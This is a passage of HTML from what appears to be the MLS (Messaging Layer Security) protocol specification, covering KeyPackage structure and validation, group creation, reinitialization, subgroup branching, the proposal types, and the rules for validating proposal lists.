<p id="section-10-1">In order to facilitate the asynchronous addition of clients to a
group, clients can pre-publish KeyPackage objects that
provide some public information about a user. A KeyPackage object specifies:<a href="#section-10-1">¬∂</a></p>
<ol start="1" type="1" id="section-10-2">
        <li id="section-10-2.1">a protocol version and cipher suite that the client supports,<a href="#section-10-2.1">¬∂</a>
</li>
        <li id="section-10-2.2">a public key that others can use to encrypt a Welcome message to this client
(an "init key"), and<a href="#section-10-2.2">¬∂</a>
</li>
        <li id="section-10-2.3">the content of the leaf node that should be added to the tree to represent
this client.<a href="#section-10-2.3">¬∂</a>
</li>
      </ol>
<p id="section-10-3">KeyPackages are intended to be used only once and <span>SHOULD NOT</span>
be reused except in the case of a "last resort" KeyPackage (see <a href="#keypackage-reuse">Section 16.8</a>).
Clients <span>MAY</span> generate and publish multiple KeyPackages to
support multiple cipher suites.<a href="#section-10-3">¬∂</a></p>
<p id="section-10-4">The value for <code>init_key</code> <span>MUST</span> be a public key for the asymmetric encryption
scheme defined by <code>cipher_suite</code>, and it <span>MUST</span> be unique among the set of
KeyPackages created by this client.  Likewise, the <code>leaf_node</code> field <span>MUST</span> be
valid for the cipher suite, including both the <code>encryption_key</code> and
<code>signature_key</code> fields.  The whole structure is signed using the client's
signature key. A KeyPackage object with an invalid signature field <span>MUST</span> be
considered malformed.<a href="#section-10-4">¬∂</a></p>
<p id="section-10-5">The signature is computed by the function <code>SignWithLabel</code> with a label
<code>"KeyPackageTBS"</code> and a <code>Content</code> input comprising all of the fields except for the
signature field.<a href="#section-10-5">¬∂</a></p>
<div id="section-10-6">
<pre>struct {
    ProtocolVersion version;
    CipherSuite cipher_suite;
    HPKEPublicKey init_key;
    LeafNode leaf_node;
    Extension extensions&lt;V&gt;;
    /* SignWithLabel(., "KeyPackageTBS", KeyPackageTBS) */
    opaque signature&lt;V&gt;;
} KeyPackage;

struct {
    ProtocolVersion version;
    CipherSuite cipher_suite;
    HPKEPublicKey init_key;
    LeafNode leaf_node;
    Extension extensions&lt;V&gt;;
} KeyPackageTBS;
</pre><p><a href="#section-10-6">¬∂</a>
</p></div>
<p id="section-10-7">If a client receives a KeyPackage carried within an MLSMessage object, then it
<span>MUST</span> verify that the <code>version</code> field of the KeyPackage has the same value as the
<code>version</code> field of the MLSMessage.  The <code>version</code> field in the KeyPackage
provides an explicit signal of the intended version to the other members of
group when they receive the KeyPackage in an Add proposal.<a href="#section-10-7">¬∂</a></p>
<p id="section-10-8">The field <code>leaf_node.capabilities</code> indicates what protocol versions,
cipher suites, credential types, and non-default proposal/extension types are supported
by the client.  (As discussed in <a href="#leaf-node-contents">Section 7.2</a>, some proposal and extension types defined in this document are considered
"default" and thus are not listed.)  This information allows MLS session
establishment to be safe from downgrade attacks on the parameters described (as
discussed in <a href="#group-creation">Section 11</a>), while still only advertising one version and
one cipher suite per KeyPackage.<a href="#section-10-8">¬∂</a></p>
<p id="section-10-9">The field <code>leaf_node.leaf_node_source</code> of the LeafNode in a KeyPackage <span>MUST</span> be
set to <code>key_package</code>.<a href="#section-10-9">¬∂</a></p>
<p id="section-10-10">Extensions included in the <code>extensions</code> or <code>leaf_node.extensions</code> fields <span>MUST</span>
be included in the <code>leaf_node.capabilities</code> field.  As discussed in
<a href="#extensibility">Section 13</a>, unknown extensions in <code>KeyPackage.extensions</code> <span>MUST</span> be
ignored, and the creator of a KeyPackage object <span>SHOULD</span> include some random GREASE
extensions to help ensure that other clients correctly ignore unknown
extensions.<a href="#section-10-10">¬∂</a></p>
<section id="keypackage-validation">
        <h3 id="name-keypackage-validation">
<a href="#section-10.1">10.1. </a><a href="#name-keypackage-validation">KeyPackage Validation</a>
        </h3>
<p id="section-10.1-1">The validity of a KeyPackage needs to be verified at a few stages:<a href="#section-10.1-1">¬∂</a></p>
<ul>
<li id="section-10.1-2.1">When a KeyPackage is downloaded by a group member, before it is used
to add the client to the group<a href="#section-10.1-2.1">¬∂</a>
</li>
          <li id="section-10.1-2.2">When a KeyPackage is received by a group member in an Add message<a href="#section-10.1-2.2">¬∂</a>
</li>
        </ul>
<p id="section-10.1-3">The client verifies the validity of a KeyPackage using the following steps:<a href="#section-10.1-3">¬∂</a></p>
<ul>
<li id="section-10.1-4.1">Verify that the cipher suite and protocol version of the KeyPackage match
those in the GroupContext.<a href="#section-10.1-4.1">¬∂</a>
</li>
          <li id="section-10.1-4.2">Verify that the <code>leaf_node</code> of the KeyPackage is valid for a KeyPackage
according to <a href="#leaf-node-validation">Section 7.3</a>.<a href="#section-10.1-4.2">¬∂</a>
</li>
          <li id="section-10.1-4.3">Verify that the signature on the KeyPackage is valid using the public key
in <code>leaf_node.credential</code>.<a href="#section-10.1-4.3">¬∂</a>
</li>
          <li id="section-10.1-4.4">Verify that the value of <code>leaf_node.encryption_key</code> is different from the value of
the <code>init_key</code> field.<a href="#section-10.1-4.4">¬∂</a>
</li>
        </ul>
</section>
</section>
<section id="group-creation">
      <h2 id="name-group-creation">
<a href="#section-11">11. </a><a href="#name-group-creation">Group Creation</a>
      </h2>
<p id="section-11-1">A group is always created with a single member, the "creator".  Other members
are then added to the group using the usual Add/Commit mechanism.<a href="#section-11-1">¬∂</a></p>
<p id="section-11-2">The creator of a group is responsible for setting the group ID, cipher suite, and
initial extensions for the group.  If the creator intends to add other members
at the time of creation, then it <span>SHOULD</span> fetch KeyPackages for the members to be
added, and select a cipher suite and extensions according to the capabilities of
the members.  To protect against downgrade attacks, the creator <span>MUST</span> use the
<code>capabilities</code> information in these KeyPackages to verify that the chosen
version and cipher suite is the best option supported by all members.<a href="#section-11-2">¬∂</a></p>
<p id="section-11-3">Group IDs <span>SHOULD</span> be constructed in such a way that there is an overwhelmingly low
probability of honest group creators generating the same group ID, even without
assistance from the Delivery Service. This can be done, for example, by making the group ID a
freshly generated random value of size <code>KDF.Nh</code>. The Delivery Service <span>MAY</span>
attempt to ensure that group IDs are globally unique by rejecting the creation
of new groups with a previously used ID.<a href="#section-11-3">¬∂</a></p>
<p id="section-11-4">To initialize a group, the creator of the group <span>MUST</span> take the
following steps:<a href="#section-11-4">¬∂</a></p>
<ul>
<li id="section-11-5.1">
          <p id="section-11-5.1.1">Initialize a one-member group with the following initial values:<a href="#section-11-5.1.1">¬∂</a></p>
<ul>
<li id="section-11-5.1.2.1">Ratchet tree: A tree with a single node, a leaf node containing an HPKE public
key and credential for the creator<a href="#section-11-5.1.2.1">¬∂</a>
</li>
            <li id="section-11-5.1.2.2">Group ID: A value set by the creator<a href="#section-11-5.1.2.2">¬∂</a>
</li>
            <li id="section-11-5.1.2.3">Epoch: 0<a href="#section-11-5.1.2.3">¬∂</a>
</li>
            <li id="section-11-5.1.2.4">Tree hash: The root hash of the above ratchet tree<a href="#section-11-5.1.2.4">¬∂</a>
</li>
            <li id="section-11-5.1.2.5">Confirmed transcript hash: The zero-length octet string<a href="#section-11-5.1.2.5">¬∂</a>
</li>
            <li id="section-11-5.1.2.6">Epoch secret: A fresh random value of size <code>KDF.Nh</code><a href="#section-11-5.1.2.6">¬∂</a>
</li>
            <li id="section-11-5.1.2.7">Extensions: Any values of the creator's choosing<a href="#section-11-5.1.2.7">¬∂</a>
</li>
          </ul>
</li>
        <li id="section-11-5.2">
          <p id="section-11-5.2.1">Calculate the interim transcript hash:<a href="#section-11-5.2.1">¬∂</a></p>
<ul>
<li id="section-11-5.2.2.1">Derive the <code>confirmation_key</code> for the epoch as described in
<a href="#key-schedule">Section 8</a>.<a href="#section-11-5.2.2.1">¬∂</a>
</li>
            <li id="section-11-5.2.2.2">Compute a <code>confirmation_tag</code> over the empty <code>confirmed_transcript_hash</code>
using the <code>confirmation_key</code> as described in <a href="#content-authentication">Section 6.1</a>.<a href="#section-11-5.2.2.2">¬∂</a>
</li>
            <li id="section-11-5.2.2.3">Compute the updated <code>interim_transcript_hash</code> from the
<code>confirmed_transcript_hash</code> and the <code>confirmation_tag</code> as described in
<a href="#transcript-hashes">Section 8.2</a>.<a href="#section-11-5.2.2.3">¬∂</a>
</li>
          </ul>
</li>
      </ul>
<p id="section-11-6">At this point, the creator's state represents a one-member group with a fully
initialized key schedule, transcript hashes, etc.  Proposals and Commits can be
generated for this group state just like any other state of the group, such as
Add proposals and Commits to add other members to the group.  A GroupInfo object
for this group state can also be published to facilitate external joins.<a href="#section-11-6">¬∂</a></p>
<p id="section-11-7">Members other than the creator join either by being sent a Welcome message (as
described in <a href="#joining-via-welcome-message">Section 12.4.3.1</a>) or by sending an external Commit
(see <a href="#joining-via-external-commits">Section 12.4.3.2</a>).<a href="#section-11-7">¬∂</a></p>
<p id="section-11-8">In principle, the above process could be streamlined by having the
creator directly create a tree and choose a random value for first
epoch's epoch secret.  We follow the steps above because it removes
unnecessary choices, by which, for example, bad randomness could be
introduced.  The only choices the creator makes here are its own
KeyPackage and the leaf secret from which the Commit is built.<a href="#section-11-8">¬∂</a></p>
<section id="required-capabilities">
        <h3 id="name-required-capabilities">
<a href="#section-11.1">11.1. </a><a href="#name-required-capabilities">Required Capabilities</a>
        </h3>
<p id="section-11.1-1">The configuration of a group imposes certain requirements on clients in the
group.  At a minimum, all members of the group need to support the cipher suite
and protocol version in use.  Additional requirements can be imposed by
including a <code>required_capabilities</code> extension in the GroupContext.<a href="#section-11.1-1">¬∂</a></p>
<div id="section-11.1-2">
<pre>struct {
    ExtensionType extension_types&lt;V&gt;;
    ProposalType proposal_types&lt;V&gt;;
    CredentialType credential_types&lt;V&gt;;
} RequiredCapabilities;
</pre><p><a href="#section-11.1-2">¬∂</a>
</p></div>
<p id="section-11.1-3">This extension lists the extensions, proposals, and credential types that must be supported by
all members of the group. The "default" proposal and extension types defined in this
document are assumed to be implemented by all clients, and need not be listed in
RequiredCapabilities in order to be safely used. Note that this is not true for
credential types.<a href="#section-11.1-3">¬∂</a></p>
<p id="section-11.1-4">For new members, support for required capabilities is enforced by existing
members during the application of Add commits.  Existing members should of
course be in compliance already.  In order to ensure this continues to be the
case even as the group's extensions are updated, a GroupContextExtensions
proposal is deemed invalid if it contains a <code>required_capabilities</code> extension that
requires non-default capabilities not supported by all current members.<a href="#section-11.1-4">¬∂</a></p>
</section>
<section id="reinitialization">
        <h3 id="name-reinitialization">
<a href="#section-11.2">11.2. </a><a href="#name-reinitialization">Reinitialization</a>
        </h3>
<p id="section-11.2-1">A group may be reinitialized by creating a new group with the same membership
and different parameters, and linking it to the old group via a resumption PSK.
The members of a group reinitialize it using the following steps:<a href="#section-11.2-1">¬∂</a></p>
<ol start="1" type="1" id="section-11.2-2">
          <li id="section-11.2-2.1">A member of the old group sends a ReInit proposal (see <a href="#reinit">Section 12.1.5</a>).<a href="#section-11.2-2.1">¬∂</a>
</li>
          <li id="section-11.2-2.2">A member of the old group sends a Commit covering the ReInit proposal.<a href="#section-11.2-2.2">¬∂</a>
</li>
          <li id="section-11.2-2.3">
            <p id="section-11.2-2.3.1">A member of the old group creates an initial Commit that sets up a new group
that matches the ReInit and sends a Welcome message:<a href="#section-11.2-2.3.1">¬∂</a></p>
<ul>
<li id="section-11.2-2.3.2.1">The <code>version</code>, <code>cipher_suite</code>, <code>group_id</code>, and <code>extensions</code> fields of the GroupContext object in the Welcome
message <span>MUST</span> be the same as the corresponding fields in the ReInit
proposal. The <code>epoch</code> in the Welcome message <span>MUST</span> be 1.<a href="#section-11.2-2.3.2.1">¬∂</a>
</li>
              <li id="section-11.2-2.3.2.2">The Welcome message <span>MUST</span> specify a PreSharedKeyID of type <code>resumption</code> with usage
<code>reinit</code>, where the <code>group_id</code> field matches the old group and the <code>epoch</code>
field indicates the epoch after the Commit covering the ReInit.<a href="#section-11.2-2.3.2.2">¬∂</a>
</li>
            </ul>
</li>
        </ol>
<p id="section-11.2-3">Note that these three steps may be done by the same group member or different
members.  For example, if a group member sends a Commit with an inline ReInit
proposal (steps 1 and 2) but then goes offline, another group member may
recreate the group instead.  This flexibility avoids situations where a group
gets stuck between steps 2 and 3.<a href="#section-11.2-3">¬∂</a></p>
<p id="section-11.2-4">Resumption PSKs with usage <code>reinit</code> <span>MUST NOT</span> be used in other contexts.  A
PreSharedKey proposal with type <code>resumption</code> and usage <code>reinit</code> <span>MUST</span> be
considered invalid.<a href="#section-11.2-4">¬∂</a></p>
</section>
<section id="subgroup-branching">
        <h3 id="name-subgroup-branching">
<a href="#section-11.3">11.3. </a><a href="#name-subgroup-branching">Subgroup Branching</a>
        </h3>
<p id="section-11.3-1">A new group can be formed from a subset of an existing group's members, using
the same parameters as the old group.<a href="#section-11.3-1">¬∂</a></p>
<p id="section-11.3-2">A member can create a subgroup by performing the following steps:<a href="#section-11.3-2">¬∂</a></p>
<ol start="1" type="1" id="section-11.3-3">
          <li id="section-11.3-3.1">Fetch a new KeyPackage for each group member that should be included in the
subgroup.<a href="#section-11.3-3.1">¬∂</a>
</li>
          <li id="section-11.3-3.2">Create an initial Commit message that sets up the new group and contains a
PreSharedKey proposal of type <code>resumption</code> with usage <code>branch</code>. To avoid key
reuse, the <code>psk_nonce</code> included in the PreSharedKeyID object <span>MUST</span> be a
randomly sampled nonce of length <code>KDF.Nh</code>.<a href="#section-11.3-3.2">¬∂</a>
</li>
          <li id="section-11.3-3.3">Send the corresponding Welcome message to the subgroup members.<a href="#section-11.3-3.3">¬∂</a>
</li>
        </ol>
<p id="section-11.3-4">A client receiving a Welcome message including a PreSharedKey of type <code>resumption</code> with
usage <code>branch</code> <span>MUST</span> verify that the new group reflects a subgroup branched from
the referenced group by checking that:<a href="#section-11.3-4">¬∂</a></p>
<ul>
<li id="section-11.3-5.1">The <code>version</code> and <code>cipher_suite</code> values in the Welcome message are the same as
those used by the old group.<a href="#section-11.3-5.1">¬∂</a>
</li>
          <li id="section-11.3-5.2">The <code>epoch</code> in the Welcome message <span>MUST</span> be 1.<a href="#section-11.3-5.2">¬∂</a>
</li>
          <li id="section-11.3-5.3">Each LeafNode in a new subgroup <span>MUST</span> match some LeafNode in the original
group. In this context, a pair of LeafNodes is said to "match" if the
identifiers presented by their respective credentials are considered
equivalent by the application.<a href="#section-11.3-5.3">¬∂</a>
</li>
        </ul>
<p id="section-11.3-6">Resumption PSKs with usage <code>branch</code> <span>MUST NOT</span> be used in other contexts.  A
PreSharedKey proposal with type <code>resumption</code> and usage <code>branch</code> <span>MUST</span> be
considered invalid.<a href="#section-11.3-6">¬∂</a></p>
</section>
</section>
<section id="group-evolution">
      <h2 id="name-group-evolution">
<a href="#section-12">12. </a><a href="#name-group-evolution">Group Evolution</a>
      </h2>
<p id="section-12-1">Over the lifetime of a group, its membership can change, and existing members
might want to change their keys in order to achieve post-compromise security.
In MLS, each such change is accomplished by a two-step process:<a href="#section-12-1">¬∂</a></p>
<ol start="1" type="1" id="section-12-2">
        <li id="section-12-2.1">A proposal to make the change is broadcast to the group in a Proposal
message.<a href="#section-12-2.1">¬∂</a>
</li>
        <li id="section-12-2.2">A member of the group or a new member broadcasts a Commit message that causes
one or more proposed changes to enter into effect.<a href="#section-12-2.2">¬∂</a>
</li>
      </ol>
<p id="section-12-3">In cases where the Proposal and Commit are sent by the same member, these two steps
can be combined by sending the proposals in the commit.<a href="#section-12-3">¬∂</a></p>
<p id="section-12-4">The group thus evolves from one cryptographic state to another each time a
Commit message is sent and processed.  These states are referred to as "epochs"
and are uniquely identified among states of the group by eight-octet epoch values.
When a new group is initialized, its initial state epoch is 0x0000000000000000.  Each time
a state transition occurs, the epoch number is incremented by one.<a href="#section-12-4">¬∂</a></p>
<section id="proposals">
        <h3 id="name-proposals">
<a href="#section-12.1">12.1. </a><a href="#name-proposals">Proposals</a>
        </h3>
<p id="section-12.1-1">Proposals are included in a FramedContent by way of a Proposal structure
that indicates their type:<a href="#section-12.1-1">¬∂</a></p>
<div id="section-12.1-2">
<pre>// See the "MLS Proposal Types" IANA registry for values
uint16 ProposalType;

struct {
    ProposalType proposal_type;
    select (Proposal.proposal_type) {
        case add:                      Add;
        case update:                   Update;
        case remove:                   Remove;
        case psk:                      PreSharedKey;
        case reinit:                   ReInit;
        case external_init:            ExternalInit;
        case group_context_extensions: GroupContextExtensions;
    };
} Proposal;
</pre><p><a href="#section-12.1-2">¬∂</a>
</p></div>
<p id="section-12.1-3">On receiving a FramedContent containing a Proposal, a client <span>MUST</span> verify the
signature inside FramedContentAuthData and that the <code>epoch</code> field of the enclosing
FramedContent is equal to the <code>epoch</code> field of the current GroupContext object.
If the verification is successful, then the Proposal should be cached in such a way
that it can be retrieved by hash (as a ProposalOrRef object) in a later Commit message.<a href="#section-12.1-3">¬∂</a></p>
<section id="add">
          <h4 id="name-add">
<a href="#section-12.1.1">12.1.1. </a><a href="#name-add">Add</a>
          </h4>
<p id="section-12.1.1-1">An Add proposal requests that a client with a specified KeyPackage be added
to the group.<a href="#section-12.1.1-1">¬∂</a></p>
<div id="section-12.1.1-2">
<pre>struct {
    KeyPackage key_package;
} Add;
</pre><p><a href="#section-12.1.1-2">¬∂</a>
</p></div>
<p id="section-12.1.1-3">An Add proposal is invalid if the KeyPackage is invalid according to
<a href="#keypackage-validation">Section 10.1</a>.<a href="#section-12.1.1-3">¬∂</a></p>
<p id="section-12.1.1-4">An Add is applied after being included in a Commit message.  The position of the
Add in the list of proposals determines the leaf node where the new member will
be added.  For the first Add in the Commit, the corresponding new member will be
placed in the leftmost empty leaf in the tree, for the second Add, the next
empty leaf to the right, etc. If no empty leaf exists, the tree is extended to
the right.<a href="#section-12.1.1-4">¬∂</a></p>
<ul>
<li id="section-12.1.1-5.1">Identify the leaf L for the new member: if there are empty leaves in the tree,
L is the leftmost empty leaf. Otherwise, the tree is extended to the right as
described in <a href="#adding-and-removing-leaves">Section 7.7</a>, and L is assigned the leftmost new
blank leaf.<a href="#section-12.1.1-5.1">¬∂</a>
</li>
            <li id="section-12.1.1-5.2">For each non-blank intermediate node along the path from the leaf L
to the root, add L's leaf index to the <code>unmerged_leaves</code> list for the node.<a href="#section-12.1.1-5.2">¬∂</a>
</li>
            <li id="section-12.1.1-5.3">Set the leaf node L to a new node containing the LeafNode object carried in
the <code>leaf_node</code> field of the KeyPackage in the Add.<a href="#section-12.1.1-5.3">¬∂</a>
</li>
          </ul>
</section>
<section id="update">
          <h4 id="name-update">
<a href="#section-12.1.2">12.1.2. </a><a href="#name-update">Update</a>
          </h4>
<p id="section-12.1.2-1">An Update proposal is a similar mechanism to Add with the distinction
that it replaces the sender's LeafNode in the tree instead of adding a new leaf
to the tree.<a href="#section-12.1.2-1">¬∂</a></p>
<div id="section-12.1.2-2">
<pre>struct {
    LeafNode leaf_node;
} Update;
</pre><p><a href="#section-12.1.2-2">¬∂</a>
</p></div>
<p id="section-12.1.2-3">An Update proposal is invalid if the LeafNode is invalid for an Update
proposal according to <a href="#leaf-node-validation">Section 7.3</a>.<a href="#section-12.1.2-3">¬∂</a></p>
<p id="section-12.1.2-4">A member of the group applies an Update message by taking the following steps:<a href="#section-12.1.2-4">¬∂</a></p>
<ul>
<li id="section-12.1.2-5.1">Replace the sender's LeafNode with the one contained in the Update proposal.<a href="#section-12.1.2-5.1">¬∂</a>
</li>
            <li id="section-12.1.2-5.2">Blank the intermediate nodes along the path from the sender's leaf to the
root.<a href="#section-12.1.2-5.2">¬∂</a>
</li>
          </ul>
</section>
<section id="remove">
          <h4 id="name-remove">
<a href="#section-12.1.3">12.1.3. </a><a href="#name-remove">Remove</a>
          </h4>
<p id="section-12.1.3-1">A Remove proposal requests that the member with the leaf index <code>removed</code> be removed
from the group.<a href="#section-12.1.3-1">¬∂</a></p>
<div id="section-12.1.3-2">
<pre>struct {
    uint32 removed;
} Remove;
</pre><p><a href="#section-12.1.3-2">¬∂</a>
</p></div>
<p id="section-12.1.3-3">A Remove proposal is invalid if the <code>removed</code> field does not identify a non-blank
leaf node.<a href="#section-12.1.3-3">¬∂</a></p>
<p id="section-12.1.3-4">A member of the group applies a Remove message by taking the following steps:<a href="#section-12.1.3-4">¬∂</a></p>
<ul>
<li id="section-12.1.3-5.1">Identify the leaf node matching <code>removed</code>.  Let L be this leaf node.<a href="#section-12.1.3-5.1">¬∂</a>
</li>
            <li id="section-12.1.3-5.2">Replace the leaf node L with a blank node.<a href="#section-12.1.3-5.2">¬∂</a>
</li>
            <li id="section-12.1.3-5.3">Blank the intermediate nodes along the path from L to the root.<a href="#section-12.1.3-5.3">¬∂</a>
</li>
            <li id="section-12.1.3-5.4">Truncate the tree by removing the right subtree until there is at least one
non-blank leaf node in the right subtree.  If the rightmost non-blank leaf has
index L, then this will result in the tree having 2<sup>d</sup> leaves, where <code>d</code> is
the smallest value such that 2<sup>d</sup> &gt; <code>L</code>.<a href="#section-12.1.3-5.4">¬∂</a>
</li>
          </ul>
</section>

<section id="reinit">
          <h4 id="name-reinit">
<a href="#section-12.1.5">12.1.5. </a><a href="#name-reinit">ReInit</a>
          </h4>
<p id="section-12.1.5-1">A ReInit proposal represents a request to reinitialize the group with different
parameters, for example, to increase the version number or to change the
cipher suite. The reinitialization is done by creating a completely new group
and shutting down the old one.<a href="#section-12.1.5-1">¬∂</a></p>
<div id="section-12.1.5-2">
<pre>struct {
    opaque group_id&lt;V&gt;;
    ProtocolVersion version;
    CipherSuite cipher_suite;
    Extension extensions&lt;V&gt;;
} ReInit;
</pre><p><a href="#section-12.1.5-2">¬∂</a>
</p></div>
<p id="section-12.1.5-3">A ReInit proposal is invalid if the <code>version</code> field is less than the version
for the current group.<a href="#section-12.1.5-3">¬∂</a></p>
<p id="section-12.1.5-4">A member of the group applies a ReInit proposal by waiting for the committer to
send the Welcome message that matches the ReInit, according to the criteria in
<a href="#reinitialization">Section 11.2</a>.<a href="#section-12.1.5-4">¬∂</a></p>
</section>
<section id="externalinit">
          <h4 id="name-externalinit">
<a href="#section-12.1.6">12.1.6. </a><a href="#name-externalinit">ExternalInit</a>
          </h4>
<p id="section-12.1.6-1">An ExternalInit proposal is used by new members that want to join a group by
using an external commit. This proposal can only be used in that context.<a href="#section-12.1.6-1">¬∂</a></p>
<div id="section-12.1.6-2">
<pre>struct {
  opaque kem_output&lt;V&gt;;
} ExternalInit;
</pre><p><a href="#section-12.1.6-2">¬∂</a>
</p></div>
<p id="section-12.1.6-3">A member of the group applies an ExternalInit message by initializing the next
epoch using an init secret computed as described in <a href="#external-initialization">Section 8.3</a>.
The <code>kem_output</code> field contains the required KEM output.<a href="#section-12.1.6-3">¬∂</a></p>
</section>
<section id="groupcontextextensions">
          <h4 id="name-groupcontextextensions">
<a href="#section-12.1.7">12.1.7. </a><a href="#name-groupcontextextensions">GroupContextExtensions</a>
          </h4>
<p id="section-12.1.7-1">A GroupContextExtensions proposal is used to update the list of extensions in
the GroupContext for the group.<a href="#section-12.1.7-1">¬∂</a></p>
<div id="section-12.1.7-2">
<pre>struct {
  Extension extensions&lt;V&gt;;
} GroupContextExtensions;
</pre><p><a href="#section-12.1.7-2">¬∂</a>
</p></div>
<p id="section-12.1.7-3">A GroupContextExtensions proposal is invalid if it includes a
<code>required_capabilities</code> extension and some members of the group do not support
some of the required capabilities (including those added in the same Commit,
and excluding those removed).<a href="#section-12.1.7-3">¬∂</a></p>
<p id="section-12.1.7-4">A member of the group applies a GroupContextExtensions proposal with the
following steps:<a href="#section-12.1.7-4">¬∂</a></p>
<ul>
<li id="section-12.1.7-5.1">Remove all of the existing extensions from the GroupContext object for the
group and replace them with the list of extensions in the proposal.  (This
is a wholesale replacement, not a merge. An extension is only carried over if
the sender of the proposal includes it in the new list.)<a href="#section-12.1.7-5.1">¬∂</a>
</li>
          </ul>
<p id="section-12.1.7-6">Note that once the GroupContext is updated, its inclusion in the
<code>confirmation_tag</code> by way of the key schedule will confirm that all members of the
group agree on the extensions in use.<a href="#section-12.1.7-6">¬∂</a></p>
</section>
<section id="external-proposals">
          <h4 id="name-external-proposals">
<a href="#section-12.1.8">12.1.8. </a><a href="#name-external-proposals">External Proposals</a>
          </h4>
<p id="section-12.1.8-1">Proposals can be constructed and sent to the group by a party
that is outside the group in two cases. One case, indicated by the <code>external</code> SenderType,
allows an entity outside the group to submit proposals to the group.
For example, an automated service might propose
removing a member of a group who has been inactive for a long time, or propose adding
a newly hired staff member to a group representing a real-world team.
An <code>external</code> sender might send a ReInit proposal to enforce a changed policy
regarding MLS versions or cipher suites.<a href="#section-12.1.8-1">¬∂</a></p>
<p id="section-12.1.8-2">The <code>external</code> SenderType requires that signers are pre-provisioned
to the clients within a group and can only be used if the
<code>external_senders</code> extension is present in the group's GroupContext.<a href="#section-12.1.8-2">¬∂</a></p>
<p id="section-12.1.8-3">The other case, indicated by the <code>new_member_proposal</code> SenderType, is useful
when existing members of the group can independently verify that an Add proposal
sent by the new joiner itself (not an existing member) is authorized. External
proposals that are not authorized are considered invalid.<a href="#section-12.1.8-3">¬∂</a></p>
<p id="section-12.1.8-4">An external proposal <span>MUST</span> be sent as a PublicMessage object, since the sender
will not have the keys necessary to construct a PrivateMessage object.<a href="#section-12.1.8-4">¬∂</a></p>
<p id="section-12.1.8-5">Proposals of some types cannot be sent by an <code>external</code> sender.  Among the
proposal types defined in this document, only the following types may be sent by
an <code>external</code> sender:<a href="#section-12.1.8-5">¬∂</a></p>
<ul>
<li id="section-12.1.8-6.1">
              <code>add</code><a href="#section-12.1.8-6.1">¬∂</a>
</li>
            <li id="section-12.1.8-6.2">
              <code>remove</code><a href="#section-12.1.8-6.2">¬∂</a>
</li>
            <li id="section-12.1.8-6.3">
              <code>psk</code><a href="#section-12.1.8-6.3">¬∂</a>
</li>
            <li id="section-12.1.8-6.4">
              <code>reinit</code><a href="#section-12.1.8-6.4">¬∂</a>
</li>
            <li id="section-12.1.8-6.5">
              <code>group_context_extensions</code><a href="#section-12.1.8-6.5">¬∂</a>
</li>
          </ul>
<p id="section-12.1.8-7">Messages from <code>external</code> senders containing proposal types other than the above
<span>MUST</span> be rejected as malformed.  New proposal types defined in the future <span>MUST</span>
define whether they may be sent by <code>external</code> senders.  The "Ext" column in
the "MLS Proposal Types" registry (<a href="#mls-proposal-types">Section 17.4</a>) reflects this property.<a href="#section-12.1.8-7">¬∂</a></p>
<section id="external-senders-extension">
            <h5 id="name-external-senders-extension">
<a href="#section-12.1.8.1">12.1.8.1. </a><a href="#name-external-senders-extension">External Senders Extension</a>
            </h5>
<p id="section-12.1.8.1-1">The <code>external_senders</code> extension is a group context extension that contains
the credentials and signature keys of senders that are permitted to send
external proposals to the group.<a href="#section-12.1.8.1-1">¬∂</a></p>
<div id="section-12.1.8.1-2">
<pre>struct {
  SignaturePublicKey signature_key;
  Credential credential;
} ExternalSender;

ExternalSender external_senders&lt;V&gt;;
</pre><p><a href="#section-12.1.8.1-2">¬∂</a>
</p></div>
</section>
</section>
</section>
<section id="proposal-list-validation">
        <h3 id="name-proposal-list-validation">
<a href="#section-12.2">12.2. </a><a href="#name-proposal-list-validation">Proposal List Validation</a>
        </h3>
<p id="section-12.2-1">A group member creating a Commit and a group member processing a Commit
<span>MUST</span> verify that the list of committed proposals is valid using one of the following
procedures, depending on whether the Commit is external or not.  If the list of
proposals is invalid, then the Commit message <span>MUST</span> be rejected as invalid.<a href="#section-12.2-1">¬∂</a></p>
<p id="section-12.2-2">For a regular, i.e., not external, Commit, the list is invalid if any of the
following occurs:<a href="#section-12.2-2">¬∂</a></p>
<ul>
<li id="section-12.2-3.1">It contains an individual proposal that is invalid as specified in <a href="#proposals">Section 12.1</a>.<a href="#section-12.2-3.1">¬∂</a>
</li>
          <li id="section-12.2-3.2">It contains an Update proposal generated by the committer.<a href="#section-12.2-3.2">¬∂</a>
</li>
          <li id="section-12.2-3.3">It contains a Remove proposal that removes the committer.<a href="#section-12.2-3.3">¬∂</a>
</li>
          <li id="section-12.2-3.4">It contains multiple Update and/or Remove proposals that apply to the same leaf.
If the committer has received multiple such proposals they <span>SHOULD</span> prefer any Remove
received, or the most recent Update if there are no Removes.<a href="#section-12.2-3.4">¬∂</a>
</li>
          <li id="section-12.2-3.5">It contains multiple Add proposals that contain KeyPackages that represent the same
client according to the application (for example, identical signature keys).<a href="#section-12.2-3.5">¬∂</a>
</li>
          <li id="section-12.2-3.6">It contains an Add proposal with a KeyPackage that represents a client already
in the group according to the application, unless there is a Remove proposal
in the list removing the matching client from the group.<a href="#section-12.2-3.6">¬∂</a>
</li>
          <li id="section-12.2-3.7">It contains multiple PreSharedKey proposals that reference the same PreSharedKeyID.<a href="#section-12.2-3.7">¬∂</a>
</li>
          <li id="section-12.2-3.8">It contains multiple GroupContextExtensions proposals.<a href="#section-12.2-3.8">¬∂</a>
</li>
          <li id="section-12.2-3.9">It contains a ReInit proposal together with any other proposal. If the committer has
received other proposals during the epoch, they <span>SHOULD</span> prefer them over the
ReInit proposal, allowing the ReInit to be resent and applied in a subsequent
epoch.<a href="#section-12.2-3.9">¬∂</a>
</li>
          <li id="section-12.2-3.10">It contains an ExternalInit proposal.<a href="#section-12.2-3.10">¬∂</a>
</li>
          <li id="section-12.2-3.11">It contains a Proposal with a non-default proposal type that is not supported by some
members of the group that will process the Commit (i.e., members being added
or removed by the Commit do not need to support the proposal type).<a href="#section-12.2-3.11">¬∂</a>
</li>
          <li id="section-12.2-3.12">After processing the Commit the ratchet tree is invalid, in particular, if it
contains any leaf node that is invalid according to <a href="#leaf-node-validation">Section 7.3</a>.<a href="#section-12.2-3.12">¬∂</a>
</li>
        </ul>
<p id="section-12.2-4">An application may extend the above procedure by additional rules, for example,
requiring application-level permissions to add members, or rules concerning
non-default proposal types.<a href="#section-12.2-4">¬∂</a></p>
<p id="section-12.2-5">For an external Commit, the list is valid if it contains only the following proposals
(not necessarily in this order):<a href="#section-12.2-5">¬∂</a></p>
<ul>
<li id="section-12.2-6.1">Exactly one ExternalInit<a href="#section-12.2-6.1">¬∂</a>
</li>
